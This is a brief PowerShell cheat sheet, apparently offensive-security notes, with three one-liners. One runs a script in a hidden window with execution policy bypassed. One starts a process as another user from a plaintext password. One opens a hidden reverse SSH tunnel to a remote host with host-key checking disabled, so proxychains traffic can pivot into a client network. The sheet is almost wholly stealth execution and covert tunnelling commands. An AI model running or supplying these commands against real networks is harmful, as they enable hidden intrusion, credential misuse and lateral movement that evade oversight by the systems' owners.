### start and creates a new process (detached)
```
Start-Process -wi 1 -FilePath "cmd" -ArgumentList "/c type <powershellScript> | powershell -WindowStyle Hidden -exec bypass"
```

### start process as another user (-wi 1 to minimize window pop up)
```
$scp = ConvertTo-SecureString '<password>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $scp); start-process -wi 1 -FilePath "cmd.exe" -ArgumentList "/c <command>" -Credential $cred
```

### forward proxychains traffic into client network, will provoce short opening of a powershell window
```
Start-Process -wi 1 -FilePath "powershell" -ArgumentList " -w hidden -c ssh -o 'StrictHostKeyChecking=no' -i .\<privateKey> -N -R 9050 <user>@<rhost>"
```

